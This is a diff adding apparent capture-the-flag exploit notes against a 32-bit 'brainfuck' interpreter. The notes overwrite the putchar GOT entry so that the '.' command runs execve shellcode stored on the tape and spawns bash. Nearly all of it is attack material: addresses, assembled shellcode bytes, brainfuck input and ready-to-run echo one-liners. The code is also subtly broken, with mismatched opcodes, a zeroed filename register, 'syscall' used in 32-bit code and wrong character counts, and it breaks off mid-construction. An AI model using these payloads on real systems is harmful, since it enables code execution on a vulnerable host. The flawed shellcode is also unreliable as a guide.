@@ -1,0 +1,71 @@
+tape ptr is stored in 0x0804a080
+ptr initially stores 0x0804a0a0 (first entry)
+case '.' is at 0x804863a
+GOT entry for putchar is at 0x08 04 a0 30 = 112 bytes before initial entry
+putchar itself is at 0x 08 04 84 d6
+
+install shellcode, move ptr to putchar GOT entry, modify putchar GOT entry to point to shellcode, invoke '.' command to call putchar and deploy payload
+
+use tape to store shellcode -- close enough to putchar
+
+    0:   b8 0b 00 00 00          mov    eax,0xb
+    5:   bb a0 a0 04 08          mov    ebx,0x804a0a0
+    a:   31 c9                   xor    ecx,ecx
+    c:   31 db                   xor    ebx,ebx
+    e:   0f 05                   syscall
+b0 0b 00 00 00 bb a0 a0 04 08 31 c9 31 db 0f 05
+\xb0\x0b\xbb\xa0\xa0\x04\x08\x31\xc9\x31\xdb\x0f\x05
+
+store "bash":   bash
+,>,>,>,>
+store eax:      \xb8\x0b
+,>,>>>>
+store ebx:      \xbb\xa0\xa0\x04\x08
+,>,>,>,>,>
+store ecx:      \x31\xc9
+,>,>
+store ebx:      \x31\xdb
+,>,>
+store syscall:  \x0f\x05
+,>,>
+move ptr back to start of tape
+<<<<<<<<<<<<<<<<<<<<
+move ptr 112 bytes to left: puts pointer on putchar GOT entry (LSB)
+<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<
+store 0xa0a4:     \xa4\xa0
+<,>,
+deploy
+.
+
+echo -n -e ",>,>,>,>,>,>>>>,>,>,>,>,>,>,>,>,>,>,><<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<,>,.\nbash\xb8\x0b\xbb\xa0\xa0\x04\x08\x31\xc9\x31\xdb\x0f\x05\xa4\xa0\n" | ./brainfuck
+run <<< $(echo -n -e ",>,>,>,>,>,>>>>,>,>,>,>,>,>,>,>,>,>,><<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<,>,.\nbash\xb8\x0b\xbb\xa0\xa0\x04\x08\x31\xc9\x31\xdb\x0f\x05\xa4\xa0\n")
+
+shellcode:
+execve
+eax = 11 = 0xb
+arg0 (ebx): const char* filename
+arg1 (ecx): const char** argv
+arg2 (edx): const char* envp
+
+
+
+
+
+
+store 'b', shift right (+99 = 99)
+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++>
+store 'a', shift right (+98 = 197)
++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++>
+store 's', shift right (+116 = 313)
++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++>
+store 'h', shift right (+105 = 418)
+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++>
+shift right to leave null terminator for string (+1 = 419)
+>
+install byte 1 of mov eax, 0xb (+201 = 619)
+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
+install byte 2 of mov eax... (+12 = 631)
+>+++++++++++
+finish constructing mov eax, put cursor at start of next op... (+4 = 635)
+>>>>
+install lea ebx, [0x0804a0a0]
